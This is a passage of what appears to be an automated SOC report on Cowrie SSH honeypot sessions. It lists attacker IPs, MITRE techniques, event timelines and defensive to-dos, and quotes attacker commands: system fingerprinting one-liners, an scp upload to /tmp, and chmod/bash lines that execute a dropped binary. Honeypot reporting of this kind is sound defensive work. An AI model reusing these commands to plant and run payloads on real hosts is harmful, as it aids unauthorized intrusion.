| `2026-07-04 03:54:56` | `cowrie.log.closed` |
| `2026-07-04 03:54:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2d1facd6026

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 03:56 |
| **Last Seen** | 2026-07-04 03:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:56:14` | `cowrie.session.connect` |
| `2026-07-04 03:56:14` | `cowrie.client.version` |
| `2026-07-04 03:56:14` | `cowrie.client.kex` |
| `2026-07-04 03:56:14` | `cowrie.login.success` |
| `2026-07-04 03:56:15` | `cowrie.session.params` |
| `2026-07-04 03:56:15` | `cowrie.command.input` |
| `2026-07-04 03:56:15` | `cowrie.command.input` |
| `2026-07-04 03:56:15` | `cowrie.command.input` |
| `2026-07-04 03:56:15` | `cowrie.command.input` |
| `2026-07-04 03:56:15` | `cowrie.command.input` |
| `2026-07-04 03:56:15` | `cowrie.command.success` |
| `2026-07-04 03:56:15` | `cowrie.command.input` |
| `2026-07-04 03:56:15` | `cowrie.command.input` |
| `2026-07-04 03:56:15` | `cowrie.command.input` |
| `2026-07-04 03:56:15` | `cowrie.command.input` |
| `2026-07-04 03:56:15` | `cowrie.log.closed` |
| `2026-07-04 03:56:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3831aa357d1c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 03:56 |
| **Last Seen** | 2026-07-04 03:56 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:56:22` | `cowrie.session.connect` |
| `2026-07-04 03:56:23` | `cowrie.client.version` |
| `2026-07-04 03:56:23` | `cowrie.client.kex` |
| `2026-07-04 03:56:28` | `cowrie.login.success` |
| `2026-07-04 03:56:33` | `cowrie.session.params` |
| `2026-07-04 03:56:33` | `cowrie.command.input` |
| `2026-07-04 03:56:35` | `cowrie.log.closed` |
| `2026-07-04 03:56:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35eee56a912a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 03:57 |
| **Last Seen** | 2026-07-04 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:57:19` | `cowrie.session.connect` |
| `2026-07-04 03:57:19` | `cowrie.client.version` |
| `2026-07-04 03:57:19` | `cowrie.client.kex` |
| `2026-07-04 03:57:19` | `cowrie.login.success` |
| `2026-07-04 03:57:20` | `cowrie.session.params` |
| `2026-07-04 03:57:20` | `cowrie.command.input` |
| `2026-07-04 03:57:20` | `cowrie.command.input` |
| `2026-07-04 03:57:20` | `cowrie.command.input` |
| `2026-07-04 03:57:20` | `cowrie.command.input` |
| `2026-07-04 03:57:20` | `cowrie.command.input` |
| `2026-07-04 03:57:20` | `cowrie.command.success` |
| `2026-07-04 03:57:20` | `cowrie.command.input` |
| `2026-07-04 03:57:20` | `cowrie.command.input` |
| `2026-07-04 03:57:20` | `cowrie.command.input` |
| `2026-07-04 03:57:20` | `cowrie.command.input` |
| `2026-07-04 03:57:20` | `cowrie.log.closed` |
| `2026-07-04 03:57:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c792fdfeab0d

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]121` |
| **First Seen** | 2026-07-04 03:58 |
| **Last Seen** | 2026-07-04 03:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:58:38` | `cowrie.session.connect` |
| `2026-07-04 03:58:38` | `cowrie.client.version` |
| `2026-07-04 03:58:38` | `cowrie.client.kex` |
| `2026-07-04 03:58:38` | `cowrie.login.success` |
| `2026-07-04 03:58:38` | `cowrie.direct-tcpip.request` |
| `2026-07-04 03:58:38` | `cowrie.direct-tcpip.data` |
| `2026-07-04 03:58:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]121` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0553ac1b22f

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]121` |
| **First Seen** | 2026-07-04 03:59 |
| **Last Seen** | 2026-07-04 03:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:59:26` | `cowrie.session.connect` |
| `2026-07-04 03:59:26` | `cowrie.client.version` |
| `2026-07-04 03:59:26` | `cowrie.client.kex` |
| `2026-07-04 03:59:27` | `cowrie.login.success` |
| `2026-07-04 03:59:27` | `cowrie.direct-tcpip.request` |
| `2026-07-04 03:59:27` | `cowrie.direct-tcpip.data` |
| `2026-07-04 03:59:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]121` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ed98f94b3b3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 04:00 |
| **Last Seen** | 2026-07-04 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:00:10` | `cowrie.session.connect` |
| `2026-07-04 04:00:10` | `cowrie.client.version` |
| `2026-07-04 04:00:10` | `cowrie.client.kex` |
| `2026-07-04 04:00:11` | `cowrie.login.success` |
| `2026-07-04 04:00:11` | `cowrie.session.params` |
| `2026-07-04 04:00:11` | `cowrie.command.input` |
| `2026-07-04 04:00:11` | `cowrie.command.input` |
| `2026-07-04 04:00:11` | `cowrie.command.input` |
| `2026-07-04 04:00:11` | `cowrie.command.input` |
| `2026-07-04 04:00:11` | `cowrie.command.input` |
| `2026-07-04 04:00:11` | `cowrie.command.success` |
| `2026-07-04 04:00:11` | `cowrie.command.input` |
| `2026-07-04 04:00:11` | `cowrie.command.input` |
| `2026-07-04 04:00:11` | `cowrie.command.input` |
| `2026-07-04 04:00:11` | `cowrie.command.input` |
| `2026-07-04 04:00:11` | `cowrie.log.closed` |
| `2026-07-04 04:00:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecfdbb5a8e0d

| Field | Detail |
|---|---|
| **Source IP** | `120.27.128[.]176` |
| **First Seen** | 2026-07-04 04:00 |
| **Last Seen** | 2026-07-04 04:00 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:00:17` | `cowrie.session.connect` |
| `2026-07-04 04:00:18` | `cowrie.client.version` |
| `2026-07-04 04:00:18` | `cowrie.client.kex` |
| `2026-07-04 04:00:23` | `cowrie.login.success` |
| `2026-07-04 04:00:26` | `cowrie.session.params` |
| `2026-07-04 04:00:26` | `cowrie.command.input` |
| `2026-07-04 04:00:28` | `cowrie.log.closed` |
| `2026-07-04 04:00:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.27.128[.]176` to AbuseIPDB if not already reported
- [ ] Block `120.27.128[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53d4c9a1c7b8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 04:03 |
| **Last Seen** | 2026-07-04 04:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:03:08` | `cowrie.session.connect` |
| `2026-07-04 04:03:08` | `cowrie.client.version` |
| `2026-07-04 04:03:08` | `cowrie.client.kex` |
| `2026-07-04 04:03:08` | `cowrie.login.success` |
| `2026-07-04 04:03:09` | `cowrie.session.params` |
| `2026-07-04 04:03:09` | `cowrie.command.input` |
| `2026-07-04 04:03:09` | `cowrie.command.input` |
| `2026-07-04 04:03:09` | `cowrie.command.input` |
| `2026-07-04 04:03:09` | `cowrie.command.input` |
| `2026-07-04 04:03:09` | `cowrie.command.input` |
| `2026-07-04 04:03:09` | `cowrie.command.success` |
| `2026-07-04 04:03:09` | `cowrie.command.input` |
| `2026-07-04 04:03:09` | `cowrie.command.input` |
| `2026-07-04 04:03:09` | `cowrie.command.input` |
| `2026-07-04 04:03:09` | `cowrie.command.input` |
| `2026-07-04 04:03:09` | `cowrie.log.closed` |
| `2026-07-04 04:03:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24d44451a15d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 04:03 |
| **Last Seen** | 2026-07-04 04:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:03:53` | `cowrie.session.connect` |
| `2026-07-04 04:03:53` | `cowrie.client.version` |
| `2026-07-04 04:03:53` | `cowrie.client.kex` |
| `2026-07-04 04:03:53` | `cowrie.login.success` |
| `2026-07-04 04:03:54` | `cowrie.session.params` |
| `2026-07-04 04:03:54` | `cowrie.command.input` |
| `2026-07-04 04:03:54` | `cowrie.command.input` |
| `2026-07-04 04:03:54` | `cowrie.command.input` |
| `2026-07-04 04:03:54` | `cowrie.command.input` |
| `2026-07-04 04:03:54` | `cowrie.command.input` |
| `2026-07-04 04:03:54` | `cowrie.command.success` |
| `2026-07-04 04:03:54` | `cowrie.command.input` |
| `2026-07-04 04:03:54` | `cowrie.command.input` |
| `2026-07-04 04:03:54` | `cowrie.command.input` |
| `2026-07-04 04:03:54` | `cowrie.command.input` |
| `2026-07-04 04:03:54` | `cowrie.log.closed` |
| `2026-07-04 04:03:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d37b026e419

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 04:06 |
| **Last Seen** | 2026-07-04 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:06:30` | `cowrie.session.connect` |
| `2026-07-04 04:06:30` | `cowrie.client.version` |
| `2026-07-04 04:06:30` | `cowrie.client.kex` |
| `2026-07-04 04:06:30` | `cowrie.login.success` |
| `2026-07-04 04:06:31` | `cowrie.session.params` |
| `2026-07-04 04:06:31` | `cowrie.command.input` |
| `2026-07-04 04:06:31` | `cowrie.command.input` |
| `2026-07-04 04:06:31` | `cowrie.command.input` |
| `2026-07-04 04:06:31` | `cowrie.command.input` |
| `2026-07-04 04:06:31` | `cowrie.command.input` |
| `2026-07-04 04:06:31` | `cowrie.command.success` |
| `2026-07-04 04:06:31` | `cowrie.command.input` |
| `2026-07-04 04:06:31` | `cowrie.command.input` |
| `2026-07-04 04:06:31` | `cowrie.command.input` |
| `2026-07-04 04:06:31` | `cowrie.command.input` |
| `2026-07-04 04:06:31` | `cowrie.log.closed` |
| `2026-07-04 04:06:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34b8cfd4f779

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 04:06 |
| **Last Seen** | 2026-07-04 04:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:06:37` | `cowrie.session.connect` |
| `2026-07-04 04:06:37` | `cowrie.client.version` |
| `2026-07-04 04:06:38` | `cowrie.client.kex` |
| `2026-07-04 04:06:38` | `cowrie.login.success` |
| `2026-07-04 04:06:38` | `cowrie.direct-tcpip.request` |
| `2026-07-04 04:06:38` | `cowrie.direct-tcpip.data` |
| `2026-07-04 04:06:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b39d76e6fcb6

| Field | Detail |
|---|---|
| **Source IP** | `138.59.233[.]5` |
| **First Seen** | 2026-07-04 04:08 |
| **Last Seen** | 2026-07-04 04:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `scp -t /tmp/gCI1bSWp` |
| **Download Attempts** | ea73a088909b53110444807188562c406c6c6c89b3748aee016bc996ab1f1318 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:08:23` | `cowrie.session.connect` |
| `2026-07-04 04:08:23` | `cowrie.client.version` |
| `2026-07-04 04:08:23` | `cowrie.client.kex` |
| `2026-07-04 04:08:24` | `cowrie.login.success` |
| `2026-07-04 04:08:24` | `cowrie.client.var` |
| `2026-07-04 04:08:25` | `cowrie.session.params` |
| `2026-07-04 04:08:25` | `cowrie.command.input` |
| `2026-07-04 04:08:25` | `cowrie.session.file_download` |
| `2026-07-04 04:08:25` | `cowrie.log.closed` |
| `2026-07-04 04:08:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.59.233[.]5` to AbuseIPDB if not already reported
- [ ] Block `138.59.233[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0e00839d692

| Field | Detail |
|---|---|
| **Source IP** | `138.59.233[.]5` |
| **First Seen** | 2026-07-04 04:08 |
| **Last Seen** | 2026-07-04 04:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `scp -t /tmp/gCI1bSWp` |
| **Download Attempts** | ea73a088909b53110444807188562c406c6c6c89b3748aee016bc996ab1f1318 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:08:23` | `cowrie.session.connect` |
| `2026-07-04 04:08:23` | `cowrie.client.version` |
| `2026-07-04 04:08:23` | `cowrie.client.kex` |
| `2026-07-04 04:08:24` | `cowrie.login.success` |
| `2026-07-04 04:08:24` | `cowrie.client.var` |
| `2026-07-04 04:08:24` | `cowrie.session.params` |
| `2026-07-04 04:08:24` | `cowrie.command.input` |
| `2026-07-04 04:08:25` | `cowrie.session.file_download` |
| `2026-07-04 04:08:25` | `cowrie.log.closed` |
| `2026-07-04 04:08:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.59.233[.]5` to AbuseIPDB if not already reported
- [ ] Block `138.59.233[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7ef939e27f7

| Field | Detail |
|---|---|
| **Source IP** | `138.59.233[.]5` |
| **First Seen** | 2026-07-04 04:08 |
| **Last Seen** | 2026-07-04 04:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp && chmod +x gCI1bSWp && bash -c ./gCI1bSWp, ./gCI1bSWp` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:08:25` | `cowrie.session.connect` |
| `2026-07-04 04:08:25` | `cowrie.client.version` |
| `2026-07-04 04:08:26` | `cowrie.client.kex` |
| `2026-07-04 04:08:26` | `cowrie.login.success` |
| `2026-07-04 04:08:27` | `cowrie.client.var` |
| `2026-07-04 04:08:27` | `cowrie.session.params` |
| `2026-07-04 04:08:27` | `cowrie.command.input` |
| `2026-07-04 04:08:27` | `cowrie.command.input` |
| `2026-07-04 04:08:27` | `cowrie.command.failed` |
| `2026-07-04 04:08:27` | `cowrie.log.closed` |
| `2026-07-04 04:08:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.59.233[.]5` to AbuseIPDB if not already reported
- [ ] Block `138.59.233[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90a07ac86463

| Field | Detail |
|---|---|
| **Source IP** | `138.59.233[.]5` |
| **First Seen** | 2026-07-04 04:08 |
| **Last Seen** | 2026-07-04 04:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp && chmod +x gCI1bSWp && bash -c ./gCI1bSWp, ./gCI1bSWp` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:08:26` | `cowrie.session.connect` |
| `2026-07-04 04:08:26` | `cowrie.client.version` |
| `2026-07-04 04:08:26` | `cowrie.client.kex` |
| `2026-07-04 04:08:26` | `cowrie.login.success` |
| `2026-07-04 04:08:27` | `cowrie.client.var` |
| `2026-07-04 04:08:28` | `cowrie.session.params` |
| `2026-07-04 04:08:28` | `cowrie.command.input` |
| `2026-07-04 04:08:28` | `cowrie.command.input` |
| `2026-07-04 04:08:28` | `cowrie.command.failed` |
| `2026-07-04 04:08:28` | `cowrie.log.closed` |
| `2026-07-04 04:08:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.59.233[.]5` to AbuseIPDB if not already reported
- [ ] Block `138.59.233[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1984a2aa7bf1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 04:08 |
| **Last Seen** | 2026-07-04 04:08 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:08:30` | `cowrie.session.connect` |
| `2026-07-04 04:08:32` | `cowrie.client.version` |
| `2026-07-04 04:08:32` | `cowrie.client.kex` |
| `2026-07-04 04:08:38` | `cowrie.login.success` |
| `2026-07-04 04:08:41` | `cowrie.session.params` |
| `2026-07-04 04:08:42` | `cowrie.command.input` |
| `2026-07-04 04:08:43` | `cowrie.log.closed` |
| `2026-07-04 04:08:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84f035a2e65d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 04:09 |
| **Last Seen** | 2026-07-04 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:09:59` | `cowrie.session.connect` |
| `2026-07-04 04:09:59` | `cowrie.client.version` |
| `2026-07-04 04:09:59` | `cowrie.client.kex` |
| `2026-07-04 04:10:00` | `cowrie.login.success` |
| `2026-07-04 04:10:00` | `cowrie.session.params` |
| `2026-07-04 04:10:00` | `cowrie.command.input` |
| `2026-07-04 04:10:00` | `cowrie.command.input` |
| `2026-07-04 04:10:00` | `cowrie.command.input` |
| `2026-07-04 04:10:00` | `cowrie.command.input` |
| `2026-07-04 04:10:00` | `cowrie.command.input` |
